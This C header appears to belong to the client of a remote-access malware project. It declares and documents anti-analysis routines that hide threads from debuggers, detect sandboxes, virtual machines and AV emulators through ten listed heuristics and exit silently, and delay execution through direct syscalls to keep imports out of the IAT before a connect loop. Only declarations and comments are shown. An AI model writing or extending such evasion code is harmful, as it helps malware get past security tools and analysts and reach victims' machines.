/*
 * client/evasion/sandbox.h  –  Sandbox / analysis environment detection
 * =======================================================================
 * Provides three functions:
 *
 *   sandbox_harden()
 *       Call once per thread at the very start of WinMain and _agent_thread.
 *       Hides the calling thread from any attached debugger via
 *       NtSetInformationThread(ThreadHideFromDebugger).  No-op on systems
 *       with no debugger attached.
 *
 *   sandbox_check()
 *       Returns TRUE  if the process appears to be running inside an
 *       automated analysis environment (sandbox, AV emulator, debugger).
 *       Returns FALSE if the environment looks like a real user system.
 *
 *   sandbox_delay()
 *       Sleep 15 s + uniform jitter [0, 10 s] via NtDelayExecution direct
 *       syscall so no Win32 Sleep() import appears in the IAT.
 *
 * Call order: sandbox_harden() → sandbox_check() → [exit if TRUE]
 *             → sandbox_delay() → connect loop.
 *
 * Checks performed by sandbox_check() (all user-mode, no driver required):
 *
 *   1. CPUID hypervisor bit  — combined with RDTSC anomaly or single CPU.
 *   2. RDTSC timing anomaly  — threshold 50 000 cycles (with check 1).
 *   3. Physical RAM < 2 GB.
 *   4. Single logical CPU    — combined with check 1.
 *   5. Known sandbox DLL names in PEB LDR  (21 entries).
 *   6. Suspicious username / computer name (14 users, 15 hosts).
 *   7. System drive < 60 GB.
 *   8. Machine uptime < 3 minutes.
 *   9. Debugger attached     — IsDebuggerPresent + NtGlobalFlag heap bits
 *                              + NtQueryInformationProcess(ProcessDebugPort).
 *  10. No user input > 60 s  — GetLastInputInfo via PEB walk into user32.
 */

#pragma once
#ifndef CLIENT_SANDBOX_H
#define CLIENT_SANDBOX_H

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#include <windows.h>

#ifdef __cplusplus
extern "C" {
#endif

/*
 * sandbox_harden()
 * ----------------
 * Hide the calling thread from any attached debugger.
 * Call once at the top of WinMain and once at the top of _agent_thread.
 * No-op when no debugger is attached.
 */
void sandbox_harden(void);

/*
 * sandbox_check()
 * ---------------
 * Run all 10 detection heuristics.  Returns TRUE if any trigger fires
 * (caller should exit silently).  Returns FALSE on a clean system.
 */
BOOL sandbox_check(void);

/*
 * sandbox_delay()
 * ---------------
 * Sleep 15 s + uniform jitter [0, 10 s] via NtDelayExecution direct
 * syscall so no Win32 Sleep() import appears in the IAT.
 * Call unconditionally before any network activity regardless of
 * sandbox_check() result.
 */
void sandbox_delay(void);

#ifdef __cplusplus
}
#endif
#endif /* CLIENT_SANDBOX_H */
